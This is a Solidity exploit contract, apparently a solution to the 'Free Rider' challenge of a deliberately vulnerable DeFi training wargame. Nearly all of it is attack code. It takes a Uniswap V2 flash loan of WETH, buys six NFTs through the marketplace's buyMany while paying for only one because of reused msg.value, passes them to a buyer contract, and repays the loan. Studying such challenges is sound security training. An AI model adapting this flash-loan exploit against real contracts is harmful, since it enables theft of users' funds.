pragma solidity 0.8.17;

import "forge-std/Test.sol";

import {IUniswapV2Router02, IUniswapV2Pair, IUniswapV2Factory} from "../free-rider/Interfaces.sol";
import {IERC721} from "openzeppelin-contracts/token/ERC721/IERC721.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";
import {FreeRiderNFTMarketplace} from "../free-rider/FreeRiderNFTMarketplace.sol";
import {WETH9} from "../WETH9.sol";
import {Address} from "openzeppelin-contracts/utils/Address.sol";

contract AttackFreeRider is IERC721Receiver {
    using Address for address;

    address _owner;
    IERC721 _dvtNFT;
    IUniswapV2Router02 _router02;
    IUniswapV2Pair _pair;
    address payable _marketplace;
    address _buyer;
    WETH9 _weth;

    constructor(
        address owner,
        address dvtNFT,
        address router02,
        address pair,
        address payable marketplace,
        address buyer,
        address payable weth
    ) {
        _owner = owner;
        _dvtNFT = IERC721(dvtNFT);
        _router02 = IUniswapV2Router02(router02);
        _pair = IUniswapV2Pair(pair);
        _marketplace = marketplace;
        _buyer = buyer;
        _weth = WETH9(weth);
    }

    function flashloan(address tokenBorrow, uint256 amount) external {
        require(msg.sender == _owner, "cannot execute tx");

        address token0 = _pair.token0();
        address token1 = _pair.token1();

        uint256 amount0Out = tokenBorrow == token0 ? amount : 0;
        uint256 amount1Out = tokenBorrow == token1 ? amount : 0;

        bytes memory data = abi.encode(tokenBorrow, amount);

        _pair.swap(amount0Out, amount1Out, address(this), data);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        address token0 = _pair.token0();
        address token1 = _pair.token1();

        require(sender == address(this), "not sender");

        (address tokenBorrow, uint256 amount) = abi.decode(data, (address, uint256));

        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;

        uint256 balance = IERC20(tokenBorrow).balanceOf(address(this));

        tokenBorrow.functionCall(abi.encodeWithSignature("withdraw(uint256)", balance));

        uint256[] memory tokenIds = new uint256[](6);

        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        FreeRiderNFTMarketplace(_marketplace).buyMany{value: 15 ether}(tokenIds);

        for (uint256 i = 0; i < 6; i++) {
            _dvtNFT.safeTransferFrom(address(this), _buyer, i);
        }

        _weth.deposit{value: 15.1 ether}();

        IERC20(tokenBorrow).transfer(address(_pair), amountToRepay);

        console.log("tx origin:", tx.origin);
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        pure
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
